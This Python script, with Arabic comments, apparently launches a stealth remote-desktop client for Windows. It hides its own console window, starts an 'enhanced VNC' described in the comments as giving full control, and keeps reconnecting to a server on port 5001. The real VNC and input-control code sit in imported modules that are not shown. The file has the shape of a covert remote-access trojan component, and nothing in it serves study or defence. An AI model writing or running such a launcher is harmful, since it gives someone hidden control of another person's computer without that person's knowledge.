#!/usr/bin/env python3
import os
import sys
import time
import threading
import subprocess
import tempfile
import ctypes
from TSM_EnhancedVNC import TSMEnhancedVNC
from TSM_InputController import TSMDesktopController

def main():
    # إخفاء نافذة الكونسول
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    # إعدادات الخادم
    server_host = 'localhost'
    server_port = 5001
    
    # إنشاء VNC محسن
    auto_vnc = TSMEnhancedVNC(server_host=server_host, server_port=server_port)
    
    # بدء VNC مع السيطرة الكاملة
    if auto_vnc.start_enhanced_vnc():
        print("TSM-SeniorOasisPanel: Stealth VNC started")
        
        # مراقبة الاتصال
        while True:
            try:
                if not auto_vnc.connected:
                    print("TSM-SeniorOasisPanel: Connection lost, attempting reconnection...")
                    if not auto_vnc.connect_to_vnc_server():
                        time.sleep(5)
                time.sleep(10)
            except KeyboardInterrupt:
                break
    else:
        print("TSM-SeniorOasisPanel: Stealth VNC failed to start")

if __name__ == "__main__":
    main()
